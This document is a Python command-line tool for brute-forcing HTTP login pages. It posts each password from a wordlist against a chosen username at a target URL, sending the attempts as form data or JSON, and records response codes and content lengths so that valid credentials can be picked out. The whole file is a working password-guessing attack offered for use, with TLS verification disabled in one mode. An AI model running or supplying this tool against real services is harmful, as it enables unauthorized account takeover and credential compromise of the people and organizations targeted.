# Web login burteforce 
import requests
import argparse
import json
import os
import time



def bruteforcer(target, wordlist, method, param_name_1, param_name_2, username):

    banner="""

+======================================================+
|    ██████╗░██████╗░██╗░░░██╗░░░░░░██╗░░░░░░█████╗░   |
|    ██╔══██╗██╔══██╗██║░░░██║░░░░░░██║░░░░░██╔══██╗   |
|    ██████╦╝██████╔╝██║░░░██║█████╗██║░░░░░██║░░██║   |
|    ██╔══██╗██╔══██╗██║░░░██║╚════╝██║░░░░░██║░░██║   |
|    ██████╦╝██║░░██║╚██████╔╝░░░░░░███████╗╚█████╔╝   |
|    ╚═════╝░╚═╝░░╚═╝░╚═════╝░░░░░░░╚══════╝░╚════╝░   |
+======================================================+
|    CODE BY: Aniket Bhagwate (NullByte007)            |
+=============================================================================+
| Attempting => Username: {}  |   Password: {}  <<<
+=============================================================================+
| Status-Code: {}     |    Content-Length: {}
+=============================================================================+
| Passwords-Checked: {}      |     Time-Elapsed: {}
+=============================================================================+
    """
    print(banner)

    response_data={}
    content_length_collection=[] # Used to store unique content lengths from responses
    response_code_collection=[] # Used to store uniue response codes from responses
    #print("{} {} {} {} {} {}".format(target,wordlist,method,param_name_1,param_name_2,username))


    wordlist = open(wordlist, "r")
    wordlist = wordlist.read().split("\n")

    if method.lower()=="data":
        cnt=1
        start_time = time.time()
        for word in wordlist:
            response = requests.post(target, data={param_name_1:username, param_name_2: word}, verify=False)            
            response_data["attempt_no_"+str(cnt)] = {"Username":username,"Password":word, "Response-Code" : response.status_code,"Content-Length" : len(response.content)}
            cnt+=1
            os.system("clear")
            print(banner.format(username, word,response.status_code, len(response.content),cnt,time.time() - start_time))
            
     #       if response.status_code==200: #Comment this out if all responses are 200 OK
          #      break #Comment this out if all responses are 200 OK

        

    elif method.lower()=="json":
        cnt=1
        start_time = time.time()
        global analysis_block
        for word in wordlist:
            response = requests.post(target, json={param_name_1:username, param_name_2: word})            
            response_data["attempt_no_"+str(cnt)] = {"Username":username,"Password":word, "Response-Code" : response.status_code,"Content-Length" : len(response.content)}
            cnt+=1
            os.system("clear")
            print(banner.format(username, word,response.status_code, len(response.content),cnt,time.time() - start_time))
            
         #   if response.status_code==200: #Comment this out if all responses are 200 OK
               # break #Comment this out if all responses are 200 OK


    with open("Results.txt",'w') as result_file:
        result_file.write(json.dumps(response_data))


    
    def analysis_block():
        for x in response_data:
            content_length_collection.append(response_data[x]['Content-Length'])
            response_code_collection.append(response_data[x]['Response-Code'])
        
        unique_content_lengths = set(content_length_collection)
        unique_response_codes = set(response_code_collection)

        
        print("[!] ------------------------- CONTENT-LENGTH ANALYSIS")
        print("+=====================================================+")
        for x in unique_content_lengths:
            print("[#] [ {} ]  RESPONSES HAD CONTENT LENGTH => [ {} ] ".format(str(response_data).count(str(x)),x))
        print("+=====================================================+")

        print("\n\n[!] -------------------------- RESPONSE-CODE ANALYSIS")
        print("+=====================================================+")    
        for x in unique_response_codes:
            print("[#] | {} |  RESPONSES HAD RESPONSE CODE => [ {} ]".format(str(response_data).count(str(x)),x))
        print("+=====================================================+")


        # Comment out this code block if all responses are 200 OK [100-106]
        """
        
        for x in response_data:
            if response_data[x]["Response-Code"]==200:
                print("\n\n------ [$] FOUND VALID CREDENTIALS ------")
                print("+========================================================+")
                print("[>] USERNAME : \033[33;5;7m {} \033[0m ".format(response_data[x]["Username"]))
                print("[>] PASSWORD : \033[33;5;7m {} \033[0m ".format(response_data[x]["Password"]))
                print("+========================================================+")
        """
        print("\n[!!!] NOTE: If all the responses are giving back status-code 200, disable the 200 status code check by commenting out lines maked with this comment - line 54,55 | 70,71 | 100-106\n")

    analysis_block()

    """
use this for analysis     

import ast
f = open("Results.txt","r")
f = f.read()
res = ast.literal_eval(f)

for x in res:
	if res[x]['Content-Length']==1808:
		print(res[x])
		# This will only print the username and password with this unique content -length
    
    """



    
def main():
    parser = argparse.ArgumentParser("Bruteforce for HTTP login pages")
    
    parser.add_argument('-t', '--target', metavar="Target URL", required=True, help="The target page for login")
    
    parser.add_argument('-w', '--wordlist',metavar="<wordlist_path>", required=True, help="The wordlist you want to use for Bruteforce" )
    
    parser.add_argument('-m', '--method', metavar="data / json", default="data", help="How is the data being sent in the http request ? (DATA / JSON)")

    parser.add_argument('-p1', '--parameter1', metavar="username parameter name", default="username", help="The name of the username parameter")

    parser.add_argument('-p2', '--parameter2', metavar="password parameter name", default="password", help="The name of the password parameter")

    parser.add_argument('-u', '--username',metavar="username", help="Username to use for bruteforce")



    args = parser.parse_args()
    bruteforcer(args.target, args.wordlist, args.method, args.parameter1, args.parameter2, args.username)


if __name__=='__main__':
    main()
